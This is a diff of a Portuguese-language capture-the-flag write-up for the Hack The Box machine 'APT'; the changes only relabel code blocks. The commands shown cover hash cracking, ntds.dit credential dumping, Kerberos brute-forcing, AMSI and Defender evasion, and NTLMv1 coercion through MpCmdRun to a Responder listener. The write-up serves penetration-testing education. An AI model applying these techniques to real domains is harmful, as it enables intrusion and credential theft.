@@ -228,7 +228,7 @@
 <p>Esta máquina tem apenas 2 portas abertas! E para não engonhar, para não ter um relatório enorme, vou ir mais direto ao assunto...</p>
 <h3 id="porta-80"><a class="header" href="#porta-80">Porta 80</a></h3>
 <p>O servidor web tem paginas de internet mas não se consegue entrar por ai... Apenas há uma informação de relevo, mas que nem sequer é preciso entrar pelo browser para ver isso</p>
-<pre><code class="language-bash">whatweb http://10.10.10.213/ | sed 's/, /\n/g'
+<pre><code class="language-powershell">whatweb http://10.10.10.213/ | sed 's/, /\n/g'
 
 #&gt;  http://10.10.10.213/ [200 OK] Bootstrap
 #&gt;  Country[RESERVED][ZZ]
@@ -244,7 +244,7 @@
 <p>O email pode ajudar mais tarde (sales@gigantichosting.com)...</p>
 <h3 id="porta-135"><a class="header" href="#porta-135">Porta 135</a></h3>
 <p>Já que o servidor Web não nos dá acesso à máquina, só ja temos mais este ponto...</p>
-<pre><code class="language-bash">rcpclient 10.10.10.213
+<pre><code class="language-powershell">rcpclient 10.10.10.213
 rcpclient 10.10.10.213 -N-U 'null' -N
 rcpclient 10.10.10.213 -U 'guest' -N
 rcpclient 10.10.10.213 -U 'anonymous' -N
@@ -266,7 +266,7 @@ rcpclient 10.10.10.213 -U '%'
 <blockquote>
 <p>https://github.com/mubix/IOXIDResolver</p>
 </blockquote>
-<pre><code class="language-bash">git clone https://github.com/mubix/IOXIDResolver
+<pre><code class="language-powershell">git clone https://github.com/mubix/IOXIDResolver
 cd IOXIDResolver
 
 python IOXIDResolver.py -t 10.10.10.213
@@ -280,7 +280,7 @@ ping6 -c 1 dead:beef::b885:d62a:d679:573f
 </code></pre>
 <p>O ping mostra que a máquina responde. A partir de agora, vamos começar novamente do zero a enumerar a máquina.</p>
 <h2 id="nmap-1"><a class="header" href="#nmap-1">Nmap</a></h2>
-<pre><code class="language-bash">nmap -p- --open -n -Pn -6 dead:beef::b885:d62a:d679:573f -oG enumeration/allPorts-IPv6 -vvv --min-rate 5000
+<pre><code class="language-powershell">nmap -p- --open -n -Pn -6 dead:beef::b885:d62a:d679:573f -oG enumeration/allPorts-IPv6 -vvv --min-rate 5000
 
 extractPorts enumeration/allPorts-IPv6
 
@@ -316,11 +316,11 @@ nmap -p53,80,88,135,389,445,464,593,636,5985,9389,47001,49664,49665,49666,49667,
 </code></pre>
 <p>Agora sim! Temos informações. Parece ser um AD/DC (Active Directory / Domain Controller). E ainda sabemos o domain (htb.local)</p>
 <p>Com essas informações, e para termos menos problemas com as diversas ferramentas por causa do IPv6, vamos colocar essas informações no /etc/hosts.</p>
-<pre><code class="language-bash">echo -e &quot;dead:beef::b885:d62a:d679:573f\tapt apt.htb.local htb.local&quot; &gt;&gt; /etc/hosts
+<pre><code class="language-powershell">echo -e &quot;dead:beef::b885:d62a:d679:573f\tapt apt.htb.local htb.local&quot; &gt;&gt; /etc/hosts
 </code></pre>
 <h2 id="smb"><a class="header" href="#smb">SMB</a></h2>
 <p>Seguindo os passos habituais, que no meu caso é tentar obter credenciais via RPC com <strong>&quot;enumdomusers&quot;</strong>, para depois tentar um AS-REP Roasting Attack, ou até mesmo tentar esse mesmo ataque à bruta com <strong>&quot;kerbrute&quot;</strong>, não obtemos resultados conclusivos. O serviço rpc não está disponível para usuários não autenticados. E o kerbrute às escuras não encontra nada. Passamos para o serviço Samba.</p>
-<pre><code class="language-bash">crackmapexec smb apt
+<pre><code class="language-powershell">crackmapexec smb apt
 #&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
 
 crackmapexec smb apt --shares
@@ -339,7 +339,7 @@ crackmapexec smb apt --shares -u '' -p ''
 #&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              SYSVOL                          Logon server share
 </code></pre>
 <p>Até que enfim vemos algo da máquina! Uma pasta partilhada de backup... Promissor...</p>
-<pre><code class="language-bash">smbclient \\\\apt\\backup -U '' -N
+<pre><code class="language-powershell">smbclient \\\\apt\\backup -U '' -N
 smb: \&gt; dir
 
 #&gt;  ---skipped---
@@ -351,7 +351,7 @@ smb: \&gt; get backup.zip
 unzip backup.zip
 </code></pre>
 <p>O ficheiro está protegido por palavra passe... Podemos tentar romper a palavra passe por força bruta com o dicionário <strong><em>rockyou.txt</em></strong> da seguinte forma:</p>
-<pre><code class="language-bash">zip2johh backup.zip &gt; hash
+<pre><code class="language-powershell">zip2johh backup.zip &gt; hash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 john hash --show
 
@@ -360,26 +360,26 @@ john hash --show
 unzip backup.zip  # iloveyousomuch
 </code></pre>
 <p>O conteúdo do ficheiro zip é espetacular! Tem um ficheiro SYSTEM e um ficheiro ntds.nit. Com esses dois ficheiros é possível extrair todos os hashes de um Domain Controller.</p>
-<pre><code class="language-bash">secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL &gt; contents/secretsdump.out
+<pre><code class="language-powershell">secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL &gt; contents/secretsdump.out
 </code></pre>
 <p>O output é enorme. Deve ser a simulação da GOOGLECORP ou coisa parecida LOOOL... 8005 linhas!!</p>
-<pre><code class="language-bash">cat secretsdump.out | grep aad | awk -F ':' '{print$1}' &gt; users
+<pre><code class="language-powershell">cat secretsdump.out | grep aad | awk -F ':' '{print$1}' &gt; users
 cat secretsdump.out | grep aad | awk -F ':' '{print$4}' &gt; hashes
 </code></pre>
 <p>Temos agora dois ficheiros, um de users, e um de hashes. Vamos primeiro enumerar os users... Para isso, nada melhor que o kerberos para enumerar os users existentes. Vamos tentar efetuar um AS-REP Roasting Attack. Se o user existe, a resposta vai ser que o usuário não tem pre autenticação ativada, e se tivermos um hash kerberos, bem podemos tentar crackeá-lo...</p>
-<pre><code class="language-bash">GetNPUsers.py htb.local/ -no-pass -usersfile users | grep -v &quot;not found&quot;
+<pre><code class="language-powershell">GetNPUsers.py htb.local/ -no-pass -usersfile users | grep -v &quot;not found&quot;
 #&gt;  [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
 #&gt;  [-] User APT$ doesn't have UF_DONT_REQUIRE_PREAUTH set
 #&gt;  [-] User henry.vinson doesn't have UF_DONT_REQUIRE_PREAUTH set
 </code></pre>
 <p>Temos 3 usuários válidos. Mas não conseguimos obter nenhum TGT. A lista de Hashes que temos poderá ter (e confirmo já que tem lol) um hash válido para 1 dos usuários. Pode estar a simular um usuário que mudou de nome mas não mudou de password. Isto pode ter facilmente verificado através de crackmapexec</p>
-<pre><code class="language-bash">crackmapexec smb apt -u valide_users -H hashes
+<pre><code class="language-powershell">crackmapexec smb apt -u valide_users -H hashes
 </code></pre>
 <p>O problema é que a máquina alvo possui algo que impede ataques por força bruta ao serviço Samba! Depois de umas 50 tentativas, a máquina bloqueia o nosso IP e é preciso reiniciar a máquina...</p>
 <p>Posto isso, podemos tentar receber um TGT com username e um HASH (ou uma password).</p>
 <h2 id="gettgtpy"><a class="header" href="#gettgtpy">getTGT.py</a></h2>
 <p>Existe uma outra utilidade do Impacket que se chama <strong>getTGT.py</strong> e que faz este serviço. O problema é que faz apenas e só uma petição. Não dá para fazer por força bruta com recurso a dicionário. Bem, isto resolve-se com bash, um <strong>for loop</strong> e paralelizar as petições. Depois ainda há outro problema. No output, não temos informações do nome ou do hash que está a ser usado. Para contornar isso, decidi enviar cada output em separado, e cujo o nome do ficheiro é simplesmente o hash... O output correcto informa que foi criado um ficheiro qualquer com o formato &quot;username.ccache&quot;. Depois com um find e um grep, é fácil recuperar o hash e o seu username...</p>
-<pre><code class="language-bash">getTGT.py -hashes :2b576acbe6bcfda7294d6bd18041b8fe htb.local/henry.vinson
+<pre><code class="language-powershell">getTGT.py -hashes :2b576acbe6bcfda7294d6bd18041b8fe htb.local/henry.vinson
 
 #&gt;  Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
 #&gt;  Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
@@ -404,7 +404,7 @@ find . -type f | xargs grep &quot;henry&quot;
 <p>henry.vinson_adm:G1#Ny5@2dvht</p>
 </blockquote>
 <p>Vamos validar com crackmapexec...</p>
-<pre><code class="language-bash">crackmapexec smb apt -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
+<pre><code class="language-powershell">crackmapexec smb apt -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
 #&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
 #&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\henry.vinson_adm:G1#Ny5@2dvht
 </code></pre>
@@ -414,7 +414,7 @@ find . -type f | xargs grep &quot;henry&quot;
 <p>Agora que temos acesso à máquina, podemos enumerar usuários locais. Com o commando <strong><em>net localgroup &quot;Remote Management Users&quot;</em></strong>, dá para perceber que apenas o nosso usuário actual tem permissões de psexec, ou evil-winrm. Já sabemos então que mesmo o Adminstrator local não tem capacidade de psexec ou evil-winrm.</p>
 <p>Vou usar a ferramenta winPEAS64.exe para enumerar a máquina mais rápidamente</p>
 <h2 id="winpeas64exe"><a class="header" href="#winpeas64exe">winPEAS64.exe</a></h2>
-<pre><code class="language-bash"># kali
+<pre><code class="language-powershell"># kali
 wget https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
 
 # Target Machine
@@ -430,7 +430,7 @@ upload /home/javali/CaptureTheFlag/HackTheBox/contents/winPEASx64.exe
 <h4 id="exemplo-com-a-prórpia-máquina-alvo"><a class="header" href="#exemplo-com-a-prórpia-máquina-alvo"><em>exemplo com a prórpia máquina alvo:</em></a></h4>
 <p><img src="Assets/HTB-Windows-Insane-APT/AMSI.png" alt="AMSI" /></p>
 <p>O Mimikatz é extremamente conhecido no mundo do Pentesting... E Windows Também o conhece. Existe uns scripts pelo github com o nome Invoke-Mimikatz.ps1, e que faz muitas coisinhas más ao Windows... Antes mesmo de executar o commando, o powershell envia a string para o AMSI analisar, e como Invoke-Mimikatz.ps1 é muitas vezes utilizada por black-hackers, o AMSI informa do potencial perigo e impede a sua execução. Uma das técnicas de bypass é a ofuscação:</p>
-<pre><code class="language-bash">&quot;Invo&quot; + &quot;ke-Mimi&quot; + &quot;katz&quot;
+<pre><code class="language-powershell">&quot;Invo&quot; + &quot;ke-Mimi&quot; + &quot;katz&quot;
 #&gt;  Invoke-Mimikatz
 </code></pre>
 <p>Assim já funciona. Poderiamos também ter usado base64, ou caracteres em hexadecimal, ou octal, ect, e juntar várias técnicas... Mas para coisinhas pequena, está ok... Para scripts, isto é chato de se fazer... Existe no próprio evil-winrm a função Bypass-4MSI. Os comandos adicionais podem ser encontrados se escrevermos <strong><em>menu</em></strong> diretamente na interface Evil-WinRM</p>
@@ -442,7 +442,7 @@ upload /home/javali/CaptureTheFlag/HackTheBox/contents/winPEASx64.exe
 <h3 id="invoke-binary"><a class="header" href="#invoke-binary">Invoke-Binary</a></h3>
 <p>Agora que temos mais liberdade no powershelll, ainda falta bypassear o Windows Defender, pois se tentar executar novamente o winPEASx64.exe, Sou barrado na mesma pelo Windows Defender... O método que iremos utilizar também está diretamente contemplado no evil-winrm e consiste em executar o binário directamente em memória RAM, sem nunca passar pelo disco rígido (terreno protegido pelo Windows Defender!). O programa que queremos executar tem de ser um programa compilado em .Net assembly, para poder ser executado directamente da RAM com essa função... Não encontrei informações de como funciona o Invoke-Binary, mas do material que vi sobre outros scripts e programs em C para fazer a mesma coisa, percebi que o programa é copiado do computador atacante diretamente para a memória RAM e é-lhe ofuscado o código, mudando nomes de funções, mudando o caminho que deveria seguir o programa, saltando em pontos diferentes da memória, ou passando por caminhos só por passar, para enganar o antivírus. Para o antivírus não reconhecer padrões no assembly.</p>
 <p>Avançando! Com o evil-winrm, basta indicar que queremos usar essa função, passar o programa e o seus argumentos</p>
-<pre><code class="language-bash"># Target Machine
+<pre><code class="language-powershell"># Target Machine
 Invoke-Binary /home/javali/CaptureTheFlag/HackTheBox/contents/winPEASx64.exe -h
 Invoke-Binary /home/javali/CaptureTheFlag/HackTheBox/contents/winPEASx64.exe log=C:\Users\henry.vinson_adm\Documents\winPEAS.out
 download &quot;C:/Users/henry.vinson_adm/Documents/winPEAS.out&quot;
@@ -455,7 +455,7 @@ cat winPEAS.out
 <p>Com a última informação recolhida, a saber, a máquina usa NTLMv1 para se autenticar, podemos tentar recuperar o hash NTLMv1.</p>
 <p>O <strong>responder</strong> permite fazer isso facilmente, mas temos de o preparar para que, quando obtivermos o hash, podermos decifrá-lo. O site https://crack.sh/ nos informa que podemos usar o salt 1122334455667788 gratuitamente para decifrar o NTLMv1.</p>
 <p>Temos de configurar o nosso responder.py para especificar o nosso salt:</p>
-<pre><code class="language-bash">which responder
+<pre><code class="language-powershell">which responder
 locate responder.conf
 cat /var/lib/dpkg/info/responder.conffiles
 #&gt;  /etc/responder/Responder.conf
@@ -463,13 +463,13 @@ sudo nano /etc/responder/Responder.conf
 </code></pre>
 <p><img src="Assets/HTB-Windows-Insane-APT/salt_challenge.png" alt="Salt - Challenge" /></p>
 <p>Depois de forçar o SALT a 1122334455667788 para ser enviado quando nos for solicitado durante o Challenge Responde Protocol, é só ligar o responder e esperar...</p>
-<pre><code class="language-bash">sudo responder -I tun0 --lm -v
+<pre><code class="language-powershell">sudo responder -I tun0 --lm -v
 </code></pre>
 <h2 id="mscmdrunexe"><a class="header" href="#mscmdrunexe">MsCmdRun.exe</a></h2>
 <p>Esperar... e esperar o que? o responder simula montes de serviços de partilha e afins, e captura hashes e informações criticas de quem se conecta a nossa máquina Kali. Mas neste plano, existe um problema... Ninguém vai-nos pedir coisas...</p>
 <p>Pois não. Ninguém vai porque é uma máquina HTB, mas mesmo assim, podemos forçar a que a máquina solicite coisas ao nosso responder, estamos ligado à máquina alvo com evil-winrm...</p>
 <p>Mas já temos tudo o que percisamos deste usuário, portanto nem vale a pena enviar petições ao nosso responder... Mas podemos fazer com que outro usuário faça uma petição... À pouco, percisámos burlar o Windows Defender... e agora, vamos percisar dele lool. Podemos dizer ao Windows Defender para verificar a perigosidade de um arquivo noutro ponto de rede. E o usuários que irá fazer isso é um administrador...</p>
-<pre><code class="language-bash">cd &quot;C:\Program Files\Windows Defender&quot;
+<pre><code class="language-powershell">cd &quot;C:\Program Files\Windows Defender&quot;
 .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.21\test.txt
 </code></pre>
 <blockquote>
@@ -483,7 +483,7 @@ sudo nano /etc/responder/Responder.conf
 <blockquote>
 <p>APT$:d167c3238864b12f5f82feae86a7f798</p>
 </blockquote>
-<pre><code class="language-bash">crackmapexec smb apt -u 'APT$' -H 'd167c3238864b12f5f82feae86a7f798'
+<pre><code class="language-powershell">crackmapexec smb apt -u 'APT$' -H 'd167c3238864b12f5f82feae86a7f798'
 
 #&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
 #&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\APT$ d167c3238864b12f5f82feae86a7f798
@@ -495,7 +495,7 @@ sudo nano /etc/responder/Responder.conf
 <p><img src="Assets/HTB-Windows-Insane-APT/Shell_Administrator.png" alt="Shell do Administrator" /></p>
 <p>Temos um shell com privilégio total sobre o Domain Controller...</p>
 <p>Agora é só copiar as flags no HTB e está feito!!</p>
-<pre><code class="language-bash">cd C:\
+<pre><code class="language-powershell">cd C:\
 cmd /c 'dir /r /s root.txt user.txt 2&gt;NUL'
 
 type C:\Users\henry.vinson_adm\Desktop\user.txt
